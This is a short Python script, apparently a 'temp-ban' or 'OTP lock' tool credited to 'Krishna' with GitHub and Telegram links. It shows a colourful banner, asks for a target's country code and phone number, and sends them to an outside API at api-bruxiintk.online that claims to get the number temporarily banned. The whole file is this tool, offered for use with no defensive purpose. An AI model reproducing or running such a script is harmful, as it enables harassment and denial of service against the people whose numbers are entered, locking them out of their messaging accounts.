import requests 
import os
import time
from rich import print

# Banner function with animated colorful text effect
def otp_lock_banner():
    os.system("cls" if os.name == "nt" else "clear")
    
    # Animated colorful text effect
    colors = ["red", "yellow", "green", "cyan", "blue", "magenta"]
    for color in colors:
        os.system("cls" if os.name == "nt" else "clear")
        print(f'''
[bold {color}]●[bold {colors[(colors.index(color) + 1) % len(colors)]}] ●[bold {colors[(colors.index(color) + 2) % len(colors)]}] ●
      .---.        .-----------
     /     \  __  /    ------
    / /     \(  )/    -----
   //////   ' \/ `   ---
  //// / // :    : ---
 // /   /  /`    '--
//          //..\\\

       ====UU====UU====
           '//||\\`
[bold white]======================================
[bold white][[bold red]^[bold white]] [bold green] Author: Krishna & Ꭰᥲʀk Ꮮᴇᴀᴅᴇʀ \n[bold white][[bold red]^[bold white]] [bold green] Github: github.com/Mr-Krishna-90 \n[bold white][[bold red]^[bold white]] [bold green] Telegram: https://t.me/+GrRkWxyiROs4ZGU1
[bold white]====================================== ''')
        time.sleep(0.5)
  
print('''[bold white]======================================
[bold white][[bold red]^[bold white]] [bold green] Author: Krishna & Ꭰᥲʀk Ꮮᴇᴀᴅᴇʀ [bold white][[bold red]^[bold white]] [bold green] Github: github.com/Mr-Krishna-90 [bold white][[bold red]^[bold white]] [bold green] Telegram: https://t.me/+GrRkWxyiROs4ZGU1
[bold white]====================================== ''')

# API function
def temp_ban_api(country_code, phone_number):
    try:
        api_url = f"https://api-bruxiintk.online/api/temp-ban?apikey=bx&ddi={country_code}&numero={phone_number}"
        response = requests.get(api_url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        if response.status_code == 200:
            return "\n[bold green] [94m[✓]Successfully done\n  [bold green]Completed..!!\n\n[bold green]Thank You For Use My Script!!\n Created By Krishna!!\n"

        else:
            return "Not done"
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"

# Main function
def main():
    otp_lock_banner()  # Display OTP Lock banner
    country_code = input("\n\033[90m[\033[91m?\033[90m]] \033[92m[?]Enter Your Country Code(ex..+91) " '\n └─> ')
    if not country_code.startswith("+"):
        country_code = "+" + country_code
    
    phone_number = input("\n\033[90m[\033[91m?\033[90m]] \033[92m[?]Enter Your Mobile Number " '\n └─> ')
    phone_number = phone_number.replace(" ", "")  # Remove spaces
    
    result = temp_ban_api(country_code, phone_number)
    print(result)

if __name__ == "__main__":
    main()